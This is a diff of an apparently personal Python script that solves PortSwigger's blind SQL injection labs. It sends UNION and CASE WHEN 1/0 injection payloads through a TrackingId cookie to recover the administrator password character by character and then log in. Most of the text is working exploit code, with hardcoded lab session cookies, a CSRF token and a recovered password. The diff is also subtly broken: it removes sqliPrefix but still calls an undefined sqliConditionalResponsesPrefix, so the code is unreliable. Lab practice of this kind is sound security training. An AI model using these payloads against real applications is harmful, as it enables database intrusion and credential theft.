@@ -1,17 +1,26 @@
 # https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
+# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
 
 import requests
 requests.packages.urllib3.disable_warnings()
 
-base = "https://ac8a1ff61e33dba180d070130087003b.web-security-academy.net"
+base = "https://ac3e1f191f04a61780e34c3400bc0067.web-security-academy.net"
 url = base
 
 proxy = "127.0.0.1:8080"
 proxies = {"https": proxy, "http": proxy}
 verify = False
-cookies = {"session": "zqQml9zBHILhCtrd6ByToPKrnHMywAld"}
+cookies = {"session": "JXTZoDRywghW1LQyJUGMaFufdOlcmCTk"}
 key = "TrackingId"
-sqliPrefix = "' UNION SELECT 'a' FROM users WHERE username = 'administrator' AND"
+digitCodePoints = [i for i in range(48, 58)]
+lowerCaseAlphabetCodePoints = [i for i in range(97, 123)]
+codePointList = digitCodePoints + lowerCaseAlphabetCodePoints
+
+def getSqliConditionalResponsesQuery(trueCondition):
+    return f"' UNION SELECT 'a' FROM users WHERE username = 'administrator' AND {trueCondition}"
+
+def getSqliConditionalErrorsQuery(trueCondition):
+    return f"' UNION SELECT CASE WHEN ({trueCondition}) THEN 1/0 ELSE NULL END-- "
 
 def findNumberOfColumns():
     for i in range(1,5):
@@ -21,22 +30,28 @@ def findNumberOfColumns():
         del cookies[key]
 
 def determineStringLength():
-    for i in range(1,25):
-        value = f"{sqliPrefix} LENGTH(password) > {i}-- "
-        cookies[key] = value
-        requests.get(url, verify=verify, proxies=proxies, cookies=cookies)
-        del cookies[key]
+    def makeRequest(func):
+        for i in range(1,25):
+            value = func(i)
+            cookies[key] = value
+            requests.get(url, verify=verify, proxies=proxies, cookies=cookies)
+            del cookies[key]
+
+    def usingConditionalResponse(i):
+        return getSqliConditionalResponsesQuery(f"LENGTH(password) > {i}-- ")
+
+    def usingConditionalError(i):
+        return getSqliConditionalErrorsQuery(f"LENGTH(password) > {i}")
+
+    # makeRequest(usingConditionalResponse)
+    makeRequest(usingConditionalError)
 
 
 def conditionalResponses(): # 20 len
-    digitCodePoints = [i for i in range(48, 58)]
-    lowerCaseAlphabetCodePoints = [i for i in range(97, 123)]
-    codePointList = digitCodePoints + lowerCaseAlphabetCodePoints
-
     def findLengthOfTrueResponse():
         lengths = {}
         for i in codePointList:
-            value = f"{sqliPrefix} SUBSTRING(password, 1, 1) = '{chr(i)}'-- "
+            value = f"{sqliConditionalResponsesPrefix} SUBSTRING(password, 1, 1) = '{chr(i)}'-- "
             cookies[key] = value
             r = requests.get(url, verify=verify, proxies=proxies, cookies=cookies)
             l = len(r.content)
@@ -49,9 +64,9 @@ def conditionalResponses(): # 20 len
         for k, v in lengths.items():
             print(f"{k}: {v}")
 
-    def determinePasswordUsingBinarySearch():
+    def determinePasswordUsingBruteForce():
         def getResponseFromRequest(i, operator, pwdSubstr):
-            value = f"{sqliPrefix} SUBSTRING(password, {i}, 1) {operator} '{pwdSubstr}'-- "
+            value = f"{sqliConditionalResponsesPrefix} SUBSTRING(password, {i}, 1) {operator} '{pwdSubstr}'-- "
             cookies[key] = value
             r = requests.get(url, verify=verify, proxies=proxies, cookies=cookies)
             del cookies[key]
@@ -73,11 +88,15 @@ def conditionalResponses(): # 20 len
         print(''.join(password))
 
     # findLengthOfTrueResponse()
-    determinePasswordUsingBinarySearch()
+    determinePasswordUsingBruteForce()
+
+def conditionalErrors():
+    pass
+    #  then 1/0 else null end from users
 
 def login():
     url = base + "/login"
-    csrf = "jWRUlTicBexYW7xkFnUpA1H1bsVWnVcv"
+    csrf = "VDykYVAf7v4IufftZGpFFeDanr409D8A"
     username = "administrator"
     password = "72qru00xujpoxc0epf23"
     data = {"csrf": csrf, "username": username, "password": password}
@@ -85,6 +104,7 @@ def login():
 
 
 # findNumberOfColumns()
-# determineStringLength()
+determineStringLength()
 # conditionalResponses()
-login()
+# conditionalErrors()
+# login()
